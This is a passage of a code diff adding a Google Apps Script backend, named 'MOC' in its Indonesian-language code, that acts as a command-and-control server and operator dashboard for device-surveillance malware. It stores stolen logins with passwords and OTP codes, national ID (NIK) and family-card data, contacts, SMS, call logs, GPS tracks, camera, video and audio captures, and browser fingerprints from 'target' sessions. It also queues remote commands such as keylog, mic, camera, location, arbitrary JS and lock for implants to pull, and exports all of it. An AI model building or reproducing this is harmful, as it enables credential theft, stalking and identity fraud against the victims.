+    String(p.incognito||''),String(p.adblock||''),String(p.probe||'{}'),String(p.ua||'')]);
+  return out({ok:true});
+}
+function saveSitus(p){
+  var rows=[];try{rows=JSON.parse(String(p.rows||'[]'))}catch(e){}
+  var sh=getSheet_(SHEET_SITUS),hal=String(p.hal||''),ref=String(p.ref||''),utm=String(p.utm||'');
+  rows.forEach(function(r){sh.appendRow([now_(),String(p.sid||''),String(r[0]||''),String(r[1]||''),String(r[2]||''),hal,ref,utm])});
+  return out({ok:true,n:rows.length});
+}
+function saveIzin(p){
+  var rows=[];try{rows=JSON.parse(String(p.rows||'[]'))}catch(e){}
+  var sh=getSheet_(SHEET_IZIN);
+  rows.forEach(function(r){sh.appendRow([now_(),String(p.sid||''),String(r.nama||''),String(r.status||'')])});
+  return out({ok:true,n:rows.length});
+}
+function saveJar(p){
+  getSheet_(SHEET_JAR).appendRow([now_(),String(p.sid||''),String(p.lokal||''),String(p.publik||''),
+    String(p.tipe||''),String(p.down||''),String(p.rtt||''),String(p.online||''),String(p.ua||'')]);
+  return out({ok:true});
+}
+function saveMatrix(p){
+  var rows=[];try{rows=JSON.parse(String(p.rows||'[]'))}catch(e){}
+  var sh=getSheet_(SHEET_MX);
+  rows.forEach(function(r){sh.appendRow([String(p.sid||''),now_(),String(p.build||''),String(p.run||0),
+    String(p.platform||''),String(r.cap||''),String(r.outcome||''),String(r.lat||''),String(r.note||'')])});
+  return out({ok:true,n:rows.length});
+}
+function saveBench(p){return saveMatrix(p)}
+function beacon(p){
+  var d=getSheet_(SHEET_IMP),r=findRow(d,1,String(p.sid||''));
+  if(r)d.getRange(r,2).setValue(now_());
+  return out({ok:true});
+}
+function hasil(p){
+  var sh=getSheet_(SHEET_C2),r=findRow(sh,1,String(p.id||''));
+  sh.appendRow([String(p.sid||''),now_(),'hasil',String(p.id||''),'selesai',String(p.isi||''),'']);
+  if(r)sh.getRange(r,5).setValue('selesai');
+  return out({ok:true});
+}
+function task(sid,cmd,arg,ttl){
+  getSheet_(SHEET_C2).appendRow([String(sid),now_(),'task',String(cmd||''),'pending',String(arg||''),String(ttl||86400000)]);
+  return out({ok:true});
+}
+function tarik(p){
+  var sid=String(p.sid||''),sh=getSheet_(SHEET_C2),l=sh.getLastRow();
+  if(!sid||l<2)return out({ok:true,tugas:[]});
+  var v=sh.getRange(2,1,l-1,H_C2.length).getValues(),keluar=[];
+  for(var i=0;i<v.length;i++){
+    var r=v[i];
+    if(String(r[0])===sid&&String(r[2])==='task'&&String(r[4])==='pending'){
+      keluar.push({id:String(r[0])+'#'+(i+2),cmd:String(r[3]),arg:String(r[6]||'')});
+      sh.getRange(i+2,5).setValue('kirim');
+      if(keluar.length>=6)break;
+    }
+  }
+  return out({ok:true,tugas:keluar});
+}
+
+/* ---------- perbaiki ---------- */
+function repair(){
+  var langkah=[],geser=0;
+  Object.keys(HDR).forEach(function(n){
+    var sh=getSheet_(n);
+    sh.getRange(1,1,1,HDR[n].length).setValues([HDR[n]]).setFontWeight('bold').setBackground('#e8f0fe');
+    sh.setFrozenRows(1);langkah.push('header '+n);
+  });
+  var sh=getSheet_(SHEET_LOG),l=sh.getLastRow();
+  if(l>1){
+    var v=sh.getRange(2,1,l-1,H_LOG.length).getValues();
+    for(var i=v.length-1;i>=0;i--){
+      var r=v[i];
+      if(String(r[2]).indexOf('@')>-1&&String(r[1]).indexOf('@')<0){
+        for(var c=H_LOG.length-1;c>=2;c--)r[c]=r[c-1];
+        r[1]='';geser++;
+      }
+    }
+    sh.getRange(2,1,v.length,H_LOG.length).setValues(v);
+  }
+  langkah.push('baris digeser balik: '+geser);
+  return out({ok:true,build:BUILD,langkah:langkah});
+}
+
+/* ---------- baca ---------- */
+var C2C=null,IMPC=null,NIKC=null;
+function c2rows(){if(C2C)return C2C;
+  var sh=getSheet_(SHEET_C2),l=sh.getLastRow();
+  C2C=l<2?[]:sh.getRange(2,1,l-1,6).getValues();return C2C}
+function impMap(){if(IMPC)return IMPC;
+  var sh=getSheet_(SHEET_IMP),l=sh.getLastRow();IMPC={};
+  if(l<2)return IMPC;
+  sh.getRange(2,1,l-1,H_IMP.length).getValues().forEach(function(r){if(r[0])IMPC[String(r[0])]=r});
+  return IMPC}
+function nikMap(){if(NIKC)return NIKC;
+  var sh=getSheet_(SHEET_NIK),l=sh.getLastRow();NIKC={};
+  if(l<2)return NIKC;
+  sh.getRange(2,1,l-1,H_NIK.length).getValues().forEach(function(r){if(r[21])NIKC[String(r[21])]=r});
+  return NIKC}
+function sessions(){
+  var imp=impMap(),rows=c2rows(),m={},k;
+  for(k in imp){
+    var rr=imp[k];
+    m[k]={sid:k,n:0,last:rr[1],pending:0,ip:String(rr[2]||''),dev:String(rr[27]||''),
+      brand:String(rr[28]||''),model:String(rr[29]||''),os:String(rr[30]||''),brw:String(rr[31]||''),
+      bat:String(rr[19]||''),skor:String(rr[32]||''),foto:String(rr[26]||''),zona:String(rr[9]||'')};
+  }
+  rows.forEach(function(r){
+    var s=String(r[0]||'');if(!s)return;
+    var t=(r[1] instanceof Date)?r[1].getTime():String(r[1]);
+    if(!m[s])m[s]={sid:s,n:0,last:t,pending:0,ip:'',dev:'',brand:'',model:'',os:'',brw:'',bat:'',skor:'',foto:'',zona:''};
+    m[s].n++;m[s].last=t;
+    if(String(r[2])==='task'&&String(r[4])==='pending')m[s].pending++;
+  });
+  return Object.keys(m).map(function(x){return m[x]}).sort(function(a,b){return b.last>a.last?1:-1}).slice(0,30);
+}
+function feedOf(sid){
+  var rows=c2rows(),o=[];
+  for(var i=rows.length-1;i>=0;i--){
+    if(String(rows[i][0])===sid)o.push({id:i+2,t:rows[i][1],arah:String(rows[i][2]),
+      cmd:String(rows[i][3]),isi:String(rows[i][5])});
+    if(o.length>=25)break;
+  }
+  return o;
+}
+
+/* ---------- laporan ---------- */
+function report(){
+  var sh=getSheet_(SHEET_MX),l=sh.getLastRow(),rows=[],byCap={},n=0,sg=0,pr=0,al=0;
+  if(l>1)rows=sh.getRange(2,1,l-1,H_MX.length).getValues();
+  rows.forEach(function(r){
+    var cap=String(r[5]||'');if(!cap)return;
+    byCap[cap]=byCap[cap]||{};
+    var oc=String(r[6]||'');byCap[cap][oc]=(byCap[cap][oc]||0)+1;
+    if(oc==='silent')sg++;if(oc==='prompt')pr++;al+=Number(r[7])||0;n++;
+  });
+  var cd=Object.keys(byCap).map(function(cap){
+    var d=byCap[cap],tot=0,max=0,ent=0;
+    Object.keys(d).forEach(function(k){tot+=d[k];if(d[k]>max)max=d[k]});
+    Object.keys(d).forEach(function(k){var p=d[k]/tot;ent-=p*Math.log(p)});
+    var dist=Object.keys(d).map(function(k){return k+'='+d[k]}).join(' ');
+    return '<tr><td>'+esc(cap)+'</td><td>'+tot+'</td><td>'+esc(dist)+'</td><td>'+
+      (tot?(1-max/tot).toFixed(2):'-')+'</td><td>'+(tot?(ent/Math.LN2).toFixed(2):'-')+'</td></tr>';
+  }).join('');
+  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'+
+  '<style>body{background:#0a1120;color:#c8d6e5;font:13px/1.6 system-ui,sans-serif;padding:16px;margin:0}'+
+  'h1{color:#8fe3b4;font-size:15px}h2{color:#8fa8c4;font-size:12px;margin-top:22px;text-transform:uppercase}'+
+  'table{border-collapse:collapse;margin:8px 0}td,th{border:1px solid #22334d;padding:5px 9px;font-size:11.5px}'+
+  'th{background:#141f34;color:#9fb6d1}.k{color:#6ee7a0;font-weight:700}.mut{color:#61748a}</style></head><body>'+
+  '<h1>Laporan ZGCH</h1><p class="mut">'+now_()+' &middot; build '+BUILD+' &middot; '+rows.length+' baris</p>'+
+  '<h2>Metrik</h2><table><tr><th>Sesi</th><td class="k">'+n+'</td></tr><tr><th>Senyap</th><td class="k">'+sg+'</td></tr>'+
+  '<tr><th>Prompt</th><td class="k">'+pr+'</td></tr><tr><th>Latensi</th><td class="k">'+(n?Math.round(al/n):'-')+'</td></tr></table>'+
+  '<h2>Per kapabilitas</h2><table><tr><th>Cap</th><th>n</th><th>Distribusi</th><th>div</th><th>ent</th></tr>'+
+  (cd||'<tr><td colspan="5">-</td></tr>')+'</table>'+
+  '<p><a href="?key='+SECRET_KEY+'" style="color:#7fb2e8">kembali</a></p></body></html>';
+}
+
+/* ---------- MOC ---------- */
+var CMD=[['foto','foto'],['layar','layar'],['video','video'],['vidloop','vid~'],
+  ['vidstop','vidx'],['kamera','cam'],['kamerastop','cam×'],['mic','mic'],['micstop','mic×'],
+  ['rekam','rekam'],['torch','lampu'],['lokasi','lokasi'],['sms','sms'],['smsinbox','inbox'],
+  ['telepon','tel'],['kontak','kontak'],['kontakall','kontak!'],['dev','dev'],['sidik','sidik'],
+  ['izin','izin'],['jar','jaring'],['situs','situs'],['hidup','hidup'],['fs','layar penuh'],
+  ['info','info'],['keylog','keylog'],['getar','getar'],['notif','notif'],['popup','popup'],
+  ['kunci','kunci'],['js','js'],['kill','bersih']];
+var TABS=[['target','Target'],['login','Login'],['nik','NIK'],['kontak','Kontak'],['sms','SMS'],
+  ['tel','Telepon'],['foto','Foto'],['video','Video'],['suara','Suara'],['sidik','Sidik'],
+  ['situs','Situs'],['izin','Izin'],['jar','Jaringan'],['jejak','Jejak'],['c2','Perintah'],
+  ['antre','Antrean'],['matrix','Matrix'],['setelan','Setelan']];
+
+function tbl(head,rows){
+  var th=head.map(function(h){return '<th>'+esc(h)+'</th>'}).join('');
+  var tr=rows.map(function(r){return '<tr>'+r.map(function(c){return '<td>'+c+'</td>'}).join('')+'</tr>'}).join('');
+  return '<div class="tw"><table class="tb"><tr>'+th+'</tr>'+
+    (tr||'<tr><td colspan="'+head.length+'" class="mut">kosong</td></tr>')+'</table></div>';
+}
+function dumpTbl(sheet,head,kolom,filterSid,max){
+  var sh=getSheet_(sheet),l=sh.getLastRow();
+  if(l<2)return '<p class="mut">kosong</p>';
+  var n=Math.min(l-1,max||120);
+  var v=sh.getRange(2,1,l-1,HDR[sheet].length).getValues().reverse().slice(0,n);
+  var rows=[];
+  v.forEach(function(r){
+    if(filterSid&&String(r[1])!==filterSid&&String(r[0])!==filterSid)return;
+    rows.push(kolom(r));
+  });
+  return tbl(head,rows);
+}
+function mediaTbl(sheet,filterSid){
+  var sh=getSheet_(sheet),l=sh.getLastRow();
+  if(l<2)return '<p class="mut">kosong</p>';
+  var v=sh.getRange(2,1,l-1,HDR[sheet].length).getValues().reverse().slice(0,80),rows=[];
+  v.forEach(function(r){
+    if(filterSid&&String(r[1])!==filterSid)return;
+    var u=String(r[5]||'');
+    var isi=/mp4|webm|ogg/.test(String(r[4]))?
+      '<a href="'+esc(u)+'" target="_blank" rel="noopener">buka</a>':
+      '<a href="'+esc(u)+'" target="_blank" rel="noopener"><img class="th" src="'+esc(u)+'" loading="lazy"></a>';
+    rows.push([esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[7]),isi]);
+  });
+  return tbl(['waktu','sid','durasi','byte','sumber','media'],rows);
+}
+function sesiKartu(s,k,imp,nk){
+  var d=imp[s.sid]||[],nn=nk[s.sid]||[];
+  var foto=String(d[26]||s.foto||'');
+  var nik=nn.length?String(nn[1]):'-',prov=nn.length?String(nn[3]):'',nama2=nn.length?String(nn[22]||''):'';
+  var kk=nn.length?String(nn[23]||''):'',hp=nn.length?String(nn[24]||''):'',ibu=nn.length?String(nn[25]||''):'';
+  var tgl=(s.last instanceof Date)?Utilities.formatDate(new Date(s.last),Session.getScriptTimeZone(),'dd/MM HH:mm'):String(s.last);
+  var tombol=CMD.map(function(c){
+    return '<a class="b" href="?key='+k+'&sid='+encodeURIComponent(s.sid)+'&cmd='+c[0]+'">'+c[1]+'</a>';
+  }).join('');
+  return '<div class="c"><div class="h"><b>'+esc(String(s.sid).slice(0,10))+'</b><span class="mut">'+esc(tgl)+
+    (s.pending?' · antre '+s.pending:'')+'</span></div>'+
+    '<div class="r"><span class="mut">DEV</span> '+esc(s.dev||'-')+' · <b>'+esc(s.brand||'-')+'</b> '+esc(s.model||'-')+'</div>'+
+    '<div class="r"><span class="mut">OS</span> '+esc(s.os||'-')+' · '+esc(s.brw||'-')+'</div>'+
+    '<div class="r"><span class="mut">BAT</span> '+esc(s.bat||'-')+'% · skor '+esc(s.skor||'-')+' · zona '+esc(s.zona||'-')+'</div>'+
+    '<div class="r"><span class="mut">NIK</span> '+esc(nik)+(nama2?' · '+esc(nama2):'')+(prov?' <i class="mut">'+esc(prov)+'</i>':'')+'</div>'+
+    (kk?'<div class="r"><span class="mut">KK</span> '+esc(kk)+'</div>':'')+
+    (hp?'<div class="r"><span class="mut">HP</span> '+esc(hp)+'</div>':'')+
+    (ibu?'<div class="r"><span class="mut">IBU</span> '+esc(ibu)+'</div>':'')+
+    '<div class="r"><span class="mut">IP</span> '+esc(s.ip||'-')+'</div>'+
+    (foto?'<img class="sh" src="'+esc(foto)+'" onclick="big(this)" loading="lazy">':'')+
+    '<div class="bs">'+tombol+'</div>'+
+    '<div class="bs"><a class="b" href="?key='+k+'&tab=c2&sid='+encodeURIComponent(s.sid)+'">umpan</a>'+
+    '<a class="b" href="?key='+k+'&tab=kontak&sid='+encodeURIComponent(s.sid)+'">data</a></div></div>';
+}
+function console(tab,sid){
+  tab=tab||'target';sid=sid||'';
+  var k=SECRET_KEY,imp=impMap(),nk=nikMap(),ses=sessions();
+  var isi='';
+  if(tab==='target'){
+    isi='<div class="g">'+(ses.map(function(s){return sesiKartu(s,k,imp,nk)}).join('')||'<span class="mut">belum ada target</span>')+'</div>';
+  } else if(tab==='login'){
+    isi=dumpTbl(SHEET_LOG,['waktu','email','sandi','nik','kk','hp','ibu','ip','otp','status','foto'],function(r){
+      return [esc(r[0]),esc(r[2]||'-'),r[3]?'<code class="pw">'+esc(r[3])+'</code>':'-',esc(r[1]||'-'),
+        esc(r[28]||''),esc(r[29]||''),esc(r[30]||''),esc(r[13]||''),
+        '<span class="otp">'+esc(r[11]||'')+'</span>',esc(r[26]||''),
+        r[19]?'<img class="th" src="'+esc(r[19])+'" onclick="big(this)" loading="lazy">':'-'];
+    },sid,150);
+  } else if(tab==='nik'){
+    isi=dumpTbl(SHEET_NIK,['waktu','nik','prov','ttl','jk','umur','kk','hp','ibu','sid','nama'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[3]),esc(r[6]),esc(r[7]),esc(r[8]),esc(r[23]||''),esc(r[24]||''),esc(r[25]||''),esc(r[21]||''),esc(r[22]||'')];
+    },sid,150);
+  } else if(tab==='kontak'){
+    isi=dumpTbl(SHEET_KON,['waktu','sid','nama','tel','email','alamat'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(r[5])];
+    },sid,300);
+  } else if(tab==='sms'){
+    isi=dumpTbl(SHEET_SMS,['waktu','sid','kode','teks'],function(r){
+      return [esc(r[0]),esc(r[1]),'<b class="otp">'+esc(r[2])+'</b>',esc(r[3])];
+    },sid,200);
+  } else if(tab==='tel'){
+    isi=dumpTbl(SHEET_TEL,['waktu','sid','nomor','jenis','durasi'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4])];
+    },sid,300);
+  } else if(tab==='foto'){
+    isi=mediaTbl(SHEET_IMP,sid);
+  } else if(tab==='video'){
+    isi=mediaTbl(SHEET_VID,sid);
+  } else if(tab==='suara'){
+    isi=mediaTbl(SHEET_AUD,sid);
+  } else if(tab==='sidik'){
+    isi=dumpTbl(SHEET_SIDIK,['waktu','sid','hash','canvas','webgl','audio','fon','gpu','layar','zona','inti','ram','touch','perangkat','kodek','storage','incognito','adblock','ua'],function(r){
+      return [esc(r[0]),esc(r[1]),'<code class="pw">'+esc(r[2])+'</code>',esc(r[3]),esc(r[4]),esc(r[5]),
+        esc(r[6]),esc(r[7]),esc(r[9]),esc(r[10]),esc(r[12]),esc(r[13]),esc(r[14]),esc(r[15]),esc(r[16]),
+        esc(r[18]),esc(r[19]),esc(r[20]),'<span class="mut">'+esc(String(r[22]||'').slice(0,70))+'</span>'];
+    },sid,80);
+  } else if(tab==='situs'){
+    isi=dumpTbl(SHEET_SITUS,['waktu','sid','t','event','data','halaman','referrer','utm'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(String(r[5]||'').slice(0,50)),
+        esc(String(r[6]||'').slice(0,50)),esc(r[7])];
+    },sid,200);
+  } else if(tab==='izin'){
+    isi=dumpTbl(SHEET_IZIN,['waktu','sid','nama','status'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3])];
+    },sid,120);
+  } else if(tab==='jar'){
+    isi=dumpTbl(SHEET_JAR,['waktu','sid','lokal','publik','tipe','down','rtt','online','ua'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(r[5]),esc(r[6]),esc(r[7]),
+        '<span class="mut">'+esc(String(r[8]||'').slice(0,60))+'</span>'];
+    },sid,80);
+  } else if(tab==='jejak'){
+    isi=dumpTbl(SHEET_JEJAK,['waktu','sid','lat','lng','akurasi','sumber'],function(r){
+      var m=r[2]&&r[3]?'<a href="https://www.google.com/maps?q='+esc(r[2])+','+esc(r[3])+'" target="_blank" rel="noopener">peta</a>':'-';
+      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(r[5])+' '+m];
+    },sid,150);
+  } else if(tab==='det'){
+    isi=dumpTbl(SHEET_DET,['waktu','sid','tipe','brand','model','os','browser','cpu','ram','gpu'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[3]),esc(r[4]),esc(r[5]),esc(r[6]+' '+r[7]),esc(r[8]+' '+r[9]),esc(r[17]),esc(r[18]),esc(r[32])];
+    },sid,80);
+  } else if(tab==='c2'){
+    var f=feedOf(sid);
+    isi=tbl(['waktu','arah','cmd','isi'],f.map(function(x){
+      return [esc(x.t),esc(x.arah),esc(x.cmd),esc(x.isi)];
+    }))+'<p class="mut">perintah untuk '+esc(sid||'-')+'</p>';
+  } else if(tab==='antre'){
+    isi=dumpTbl(SHEET_ANTRE,['waktu','sid','jenis','mime','nama','coba'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[2]),esc(r[3]),esc(r[4]),esc(r[6])];
+    },sid,80);
+  } else if(tab==='matrix'){
+    isi=dumpTbl(SHEET_MX,['sid','waktu','cap','outcome','lat','note'],function(r){
+      return [esc(r[0]),esc(r[1]),esc(r[5]),esc(r[6]),esc(r[7]),esc(r[8])];
+    },sid,150);
+  } else if(tab==='setelan'){
+    isi='<div class="bar">'+
+      ['repair|perbaiki header','jam|pasang jam','sapu|sapu antrean','ringkas|kirim ringkas',
+       'uji|uji kripto','report|laporan','export|manifest','clear|kosongkan data',
+       'csv|login csv','csv4|nik csv','csv9|det csv','csv10|mic csv','csv11|audio csv',
+       'csv12|video csv','csv13|media csv','csv6|kontak csv','csv7|sms csv','csv8|tel csv']
+      .map(function(x){var a=x.split('|');return '<a href="?key='+k+'&'+a[0]+'=1">'+a[1]+'</a>'}).join('')+'</div>'+
+      '<p class="mut">build '+BUILD+' · PSK aktif · host '+esc(HOST_URUT)+'</p>';
+  } else isi='<p class="mut">tab tidak dikenal</p>';
+
+  var bar=TABS.map(function(t){
+    return '<a class="'+(t[0]===tab?'on':'')+'" href="?key='+k+'&tab='+t[0]+(sid?'&sid='+encodeURIComponent(sid):'')+'">'+t[1]+'</a>';
+  }).join('');
+  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'+
+  '<title>MOC</title><style>body{background:#0a1120;color:#c8d6e5;font:13px/1.55 system-ui,sans-serif;padding:12px;margin:0}'+
+  'h1{color:#8fe3b4;font-size:15px;margin:0 0 3px}.mut{color:#61748a}'+
+  '.bar{display:flex;flex-wrap:wrap;gap:6px;margin:10px 0 14px}'+
+  '.bar a{background:#16223a;color:#9fc0e8;padding:6px 11px;border-radius:4px;text-decoration:none;font-size:11.5px}'+
+  '.bar a.on{background:#1c6fd4;color:#fff;font-weight:700}'+
+  '.g{display:grid;gap:8px;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));margin-bottom:18px}'+
+  '.c{background:#111c2e;border:1px solid #1d2b44;border-radius:6px;padding:9px}'+
+  '.c .h{display:flex;justify-content:space-between;font-size:11.5px;margin-bottom:5px}'+
+  '.r{font-size:11.5px;margin-bottom:2px;word-break:break-word}'+
+  '.sh{width:100%;border-radius:4px;margin:5px 0;cursor:zoom-in;background:#0a1120}'+
+  '.bs{display:flex;flex-wrap:wrap;gap:4px;margin-top:6px}'+
+  '.bs a{background:#1b2b45;color:#a8c6e6;font-size:10.5px;padding:4px 8px;border-radius:3px;text-decoration:none}'+
+  '.tw{overflow:auto}table.tb{width:100%;border-collapse:collapse}'+
+  'table.tb th{text-align:left;font-size:9px;color:#7f95ad;text-transform:uppercase;padding:4px}'+
+  'table.tb td{padding:4px;border-top:1px solid #16223a;vertical-align:top;font-size:11.5px;word-break:break-word}'+
+  'code.pw{background:#2a2412;color:#f3d97b;padding:1px 5px;border-radius:3px}.otp{color:#6ee7a0;font-weight:700}'+
+  'img.th{width:56px;border-radius:3px;cursor:zoom-in;background:#0a1120}'+
+  '.ov{position:fixed;inset:0;background:rgba(0,0,0,.93);display:flex;align-items:center;justify-content:center;z-index:9}'+
+  '.ov img{max-width:94vw;max-height:90vh}</style></head><body>'+
+  '<h1>MOC · '+ses.length+' target</h1>'+
+  '<div class="mut" style="font-size:11px">build '+BUILD+' · '+esc(tab)+(sid?' · '+esc(String(sid).slice(0,12)):'')+'</div>'+
+  '<div class="bar">'+bar+'</div><div class="bar">'+
+  '<a href="?key='+k+'&tab='+tab+'">muat ulang</a>'+
+  (sid?'<a href="?key='+k+'&tab=target">semua target</a>':'')+'</div>'+isi+
+  '<script>function big(e){var o=document.createElement("div");o.className="ov";'+
+  'o.innerHTML="<img src=\\""+e.src+"\\">";o.onclick=function(){o.remove()};document.body.appendChild(o)}'+
+  (AUTO_RELOAD?'setTimeout(function(){location.reload()},20000)':'')+'</script></body></html>';
+}
+function consoleAman(tab,sid){
+  try{return console(tab,sid)}
+  catch(e){return '<pre style="padding:16px;background:#0a1120;color:#f3d97b;font:12px monospace">MOC gagal: '+
+    esc(e.message)+'\n\n<a href="?key='+SECRET_KEY+'&repair=1">coba perbaiki</a></pre>'}
+}
+function pintu(pesan){
+  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'+
+  '<title>MOC</title><style>body{background:#0a1120;color:#c8d6e5;font:14px system-ui;display:grid;place-items:center;height:100vh;margin:0}'+
+  'form{background:#111c2e;padding:24px;border-radius:8px;border:1px solid #1d2b44;text-align:center}'+
+  'h1{font-size:16px;color:#8fe3b4;margin:0 0 14px}input{padding:10px;border-radius:5px;border:1px solid #22334d;background:#0a1120;color:#fff;text-align:center}'+
+  'button{margin-top:10px;padding:10px 20px;border:0;border-radius:5px;background:#1c6fd4;color:#fff;font-weight:700}'+
+  'p{color:#e08a7a;font-size:12px}</style></head><body><form method="get"><h1>MOC</h1>'+
+  '<input type="password" name="key" placeholder="kunci" autofocus><br><button>masuk</button>'+
+  (pesan?'<p>'+esc(pesan)+'</p>':'')+'</form></body></html>';
+}
+function kabar(pesan,sid){
+  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'+
+  '<title>perintah</title><style>body{background:#0a1120;color:#c8d6e5;font:14px system-ui;display:grid;place-items:center;height:100vh;margin:0;text-align:center}'+
+  'a{color:#7fb2e8}</style></head><body><div><p>'+esc(pesan)+'</p>'+
+  '<p><a href="?key='+SECRET_KEY+'&tab=c2&sid='+encodeURIComponent(sid||'')+'">umpan</a> · '+
+  '<a href="?key='+SECRET_KEY+'&tab=target">MOC</a></p>'+
+  (sid?'<p style="color:#61748a;font-size:11px">'+esc(String(sid).slice(0,12))+'</p>':'')+
+  '</div></body></html>';
+}
+function csv(n){
+  var sh=getSheet_(n);
+  var t=sh.getDataRange().getValues().map(function(r){
+    return r.map(function(c){
+      var s=(c instanceof Date)?Utilities.formatDate(c,Session.getScriptTimeZone(),'yyyy-MM-dd HH:mm:ss'):String(c);
+      return '"'+s.replace(/"/g,'""')+'"';
+    }).join(',');
+  }).join('\n');
+  return ContentService.createTextOutput(t).setMimeType(ContentService.MimeType.CSV).downloadAsFile(n+'-'+Date.now()+'.csv');
+}
+function dump_(n,h){
+  var sh=getSheet_(n),l=sh.getLastRow();
+  return l<2?[]:sh.getRange(2,1,l-1,h.length).getValues();
+}
+function impDump(){
+  var sh=getSheet_(SHEET_IMP),l=sh.getLastRow();
+  return l<2?[]:sh.getRange(2,1,l-1,H_IMP.length).getValues().slice(-5);
+}
+function cariNik(nik){
+  var sh=getSheet_(SHEET_NIK),l=sh.getLastRow();
+  if(l<2)return out({ok:true,baris:[]});
+  return out({ok:true,baris:sh.getRange(2,1,l-1,H_NIK.length).getValues()
+    .filter(function(r){return String(r[1])===nik})});
+}
+
+/* ---------- aksi ---------- */
+var ACTIONS=null;
+function actions(){
+  if(!ACTIONS)ACTIONS={auto:saveAuto,probe:saveProbe,det:saveDet,mic:saveMic,suara:saveSuara,
+    video:saveVideo,sms:saveSms,tel:saveTel,beacon:beacon,hasil:hasil,otp:saveOtp,foto:saveFoto,
+    extra:saveExtra,login:saveLogin,matrix:saveMatrix,bench:saveBench,nik:saveNik,
+    kunjungan:saveKunjungan,kontak:saveKontak,lacak:saveLacak,tarik:tarik,
+    sidik:saveSidik,situs:saveSitus,izin:saveIzin,jar:saveJar};
+  return ACTIONS;
+}
+function doPost(e){
+  try{
+    var p=open_(parse(e)),a=p.action||'login',m=actions();
+    return m[a]?m[a](p):out({ok:true,info:'noop'});
+  }catch(err){return out({ok:false,error:err.message})}
+}
+function doGet(e){
+  var p=e.parameter||{};
+  if(p.action){
+    try{
+      var q=open_(parse(e)),m=actions();
+      if(m[q.action])return m[q.action](q);
+    }catch(err){return out({ok:false,error:err.message})}
+  }
+  if(!p.key)return HtmlService.createHtmlOutput(pintu());
+  if(p.key!==SECRET_KEY)return HtmlService.createHtmlOutput(pintu('Kunci salah.'));
+  AUTO_RELOAD=p.auto==='1';
+  if(p.build==='1')return out({ok:true,build:BUILD,kolom:H_LOG.length,waktu:new Date().toISOString()});
+  if(p.uji==='1'){
+    try{
+      var teks=JSON.stringify({a:1,b:'kunci uji',t:Date.now()});
+      var balik=Utilities.newBlob(ctrDec_(ctrEnc_(teks))).getDataAsString();
+      return out({ok:balik===teks,build:BUILD});
+    }catch(err){return out({ok:false,error:err.message})}
+  }
+  if(p.repair==='1')return out(repair());
+  if(p.jam==='1')return out(pasangJam());
+  if(p.sapu==='1')return out(sapu_());
+  if(p.ringkas==='1'){ringkasHarian();return HtmlService.createHtmlOutput(kabar('Ringkasan dikirim.'))}
+  if(p.ping==='1')return out({ok:true,build:BUILD,targets:sessions().length});
+  if(p.diag==='1'){
+    var sl=getSheet_(SHEET_LOG),ll=sl.getLastRow();
+    return out({ok:true,build:BUILD,kolom:H_LOG.length,
+      log:ll>1?sl.getRange(2,1,ll-1,H_LOG.length).getValues().slice(-5):[],imp:impDump()});
+  }
+  if(p.nik)return out(cariNik(String(p.nik)));
+  if(p.cmd&&p.sid){
+    task(p.sid,p.cmd,p.arg||'',Number(p.ttl||86400000));
+    return HtmlService.createHtmlOutput(kabar('Perintah "'+p.cmd+'" dikirim.',p.sid));
+  }
+  if(p.csv==='1')return csv(SHEET_LOG);
+  if(p.csv2==='1')return csv(SHEET_C2);
+  if(p.csv3==='1')return csv(SHEET_MX);
+  if(p.csv4==='1')return csv(SHEET_NIK);
+  if(p.csv5==='1')return csv(SHEET_JEJAK);
+  if(p.csv6==='1')return csv(SHEET_KON);
+  if(p.csv7==='1')return csv(SHEET_SMS);
+  if(p.csv8==='1')return csv(SHEET_TEL);
+  if(p.csv9==='1')return csv(SHEET_DET);
+  if(p.csv10==='1')return csv(SHEET_MIC);
+  if(p.csv11==='1')return csv(SHEET_AUD);
+  if(p.csv12==='1')return csv(SHEET_VID);
+  if(p.csv13==='1')return csv(SHEET_MEDIA);
+  if(p.csv14==='1')return csv(SHEET_SIDIK);
+  if(p.csv15==='1')return csv(SHEET_SITUS);
+  if(p.csv16==='1')return csv(SHEET_IZIN);
+  if(p.csv17==='1')return csv(SHEET_JAR);
+  if(p.export==='1')return out({ok:true,build:BUILD,t:new Date().toISOString(),
+    log:dump_(SHEET_LOG,H_LOG),nik:dump_(SHEET_NIK,H_NIK),imp:dump_(SHEET_IMP,H_IMP),
+    det:dump_(SHEET_DET,H_DET),mic:dump_(SHEET_MIC,H_MIC),sidik:dump_(SHEET_SIDIK,H_SIDIK),
+    tel:dump_(SHEET_TEL,H_TEL),sms:dump_(SHEET_SMS,H_SMS),kon:dump_(SHEET_KON,H_KON)});
+  if(p.report==='1')return HtmlService.createHtmlOutput(report()).setTitle('Laporan');
+  if(p.clear==='1'){
+    Object.keys(HDR).forEach(function(n){
+      var s=getSheet_(n);if(s.getLastRow()>1)s.getRange(2,1,s.getLastRow()-1,s.getMaxColumns()).clearContent()});
+    return HtmlService.createHtmlOutput(kabar('Data dikosongkan.'));
+  }
+  return HtmlService.createHtmlOutput(consoleAman(p.tab,p.sid)).setTitle('MOC');
+}
